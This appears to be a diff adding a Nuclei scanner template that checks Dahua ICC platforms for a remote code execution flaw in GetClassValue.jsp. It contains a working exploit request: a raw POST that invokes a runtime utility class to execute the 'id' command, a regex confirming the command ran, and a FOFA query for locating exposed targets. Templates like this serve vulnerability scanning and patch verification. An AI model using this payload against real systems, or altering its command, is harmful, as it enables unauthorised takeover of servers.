@@ -1,0 +1,42 @@
+id: dahua-icc-getclassvalue-rce
+
+info:
+  name: Dahua ICC GetClassValue - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |
+    大华智能物联综合管理平台GetClassValue.jsp存在远程代码执行漏洞，攻击者可获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/3jO_SiuJcLgxOJxcv4ULFQ
+  metadata:
+    fofa-query: app="dahua-DSS"
+    verified: true
+  tags: Dahua-ICC
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 121
+
+        {
+            "data": {
+                "clazzName": "com.dahua.admin.util.RuntimeUtil",
+                "methodName": "syncexecReturnInputStream",
+                "fieldName": ["id"]
+            }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: status
+        status:
+          - 200
